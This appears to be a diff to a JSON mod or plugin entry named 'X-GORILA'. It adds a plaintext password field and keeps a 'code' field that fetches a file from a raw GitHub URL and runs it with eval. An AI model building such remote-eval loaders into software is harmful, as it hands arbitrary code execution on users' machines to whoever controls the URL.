@@ -2,5 +2,6 @@
   "directory": "XGORILA",
   "description": "xgorila",
   "display": "X-GORILA",
-  "code": "async function a(){eval(await fh('https://raw.githubusercontent.com/kenzz-sz/Zynx_/refs/heads/main/main/mods/item/locked.json'))} a()"
+  "code": "async function a(){eval(await fh('https://raw.githubusercontent.com/kenzz-sz/Zynx_/refs/heads/main/main/mods/item/locked.json'))} a()",
+"password": "XTC"
 }
